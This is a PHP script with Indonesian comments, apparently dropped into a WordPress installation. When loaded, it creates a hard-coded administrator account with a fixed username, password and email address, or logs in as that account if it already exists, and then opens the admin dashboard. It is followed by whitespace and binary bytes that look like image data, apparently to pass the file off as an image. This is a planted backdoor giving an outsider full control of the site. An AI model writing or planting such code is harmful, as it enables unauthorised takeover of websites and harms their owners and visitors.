<?php
// Pastikan file ini dijalankan di dalam konteks WordPress
require_once('wp-load.php');

// Informasi pengguna
$username = 'trinity'; // Ganti dengan username yang diinginkan
$password = 'Anjinglah123?'; // Ganti dengan password yang diinginkan
$email = 'trinitylegion7@gmail.com'; // Ganti dengan email yang diinginkan

// Cek apakah username sudah ada
if (username_exists($username) == null && email_exists($email) == false) {
    // Buat pengguna baru
    $user_id = wp_create_user($username, $password, $email);

    if (!is_wp_error($user_id)) {
        // Set peran sebagai administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        echo "Pengguna administrator baru berhasil dibuat. Anda akan diarahkan untuk login otomatis.";

        // Login otomatis
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        wp_redirect(admin_url()); // Arahkan ke dashboard admin
        exit;
    } else {
        echo "Gagal membuat pengguna: " . $user_id->get_error_message();
    }
} else {
    // Pengguna sudah ada, lakukan login otomatis
    $user = get_user_by('login', $username);

    if ($user) {
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_redirect(admin_url()); // Arahkan ke dashboard admin
        exit;
    } else {
        echo "Pengguna tidak ditemukan.";
    }
}
?>


           

     


���C ��������������������������"����������#Qr��������������������&���������1!�A"2qQa������?��y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H��@T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S���x?"���Y騐�O�    q�`~~�t�U�Cڒ�V     I1��_��
